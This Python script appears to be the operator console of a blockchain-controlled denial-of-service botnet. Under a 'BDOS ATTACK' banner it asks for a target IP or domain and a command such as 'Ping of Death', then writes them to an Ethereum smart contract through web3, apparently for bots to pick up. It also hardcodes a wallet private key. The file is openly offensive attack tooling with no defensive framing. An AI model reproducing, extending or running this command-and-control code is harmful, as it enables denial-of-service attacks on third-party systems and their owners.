import time
import pyfiglet
from web3 import Web3, HTTPProvider


contract_address = ["0x6fEd0f6018B55Fdb17970235c4842594d594DEc4"]
wallet_private_key = ["0x3b8d3bc7ef9b97a3e230b64bf810864ceaaa2b47e47c15b7cab0eed9d761ca50"]
wallet_address = ["0xf5ee20e89ff85922f1ba9150488bea1037d43088"]  # account address

w3 = Web3(HTTPProvider("http://127.0.0.1:8545"))
w3.eth.defaultAccount = w3.eth.accounts[0]

myContract = w3.eth.contract(address='0x6fEd0f6018B55Fdb17970235c4842594d594DEc4', abi=[
    {
        "constant": False,
        "inputs": [
            {
                "name": "_ip_address",
                "type": "string"
            },
            {
                "name": "_time",
                "type": "string"
            },
            {
                "name": "_command",
                "type": "string"
            }
        ],
        "name": "set_target",
        "outputs": [],
        "payable": False,
        "stateMutability": "nonpayable",
        "type": "function",
        "signature": "0x53e4bc69"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "get_target",
        "outputs": [
            {
                "name": "",
                "type": "string"
            },
            {
                "name": "",
                "type": "string"
            },
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x0c9ce52f"
    }
])
ascii_banner = pyfiglet.figlet_format("BDOS ATTACK")
print(63 * '-')
print(ascii_banner)
print(63 * '-')
print("1. Ping of Death")
print("2. Ip info")
print("3. Exit")
print(63 * '-')
while True:
    ip = input("Please define the target's ip address or domain:")
    command = input("Which command do you want to execute?")
    timestmp = str(time.time())
    myContract.functions.set_target(ip, timestmp, command).transact({'from': w3.eth.accounts[0]})
    if command == "3":
        break;
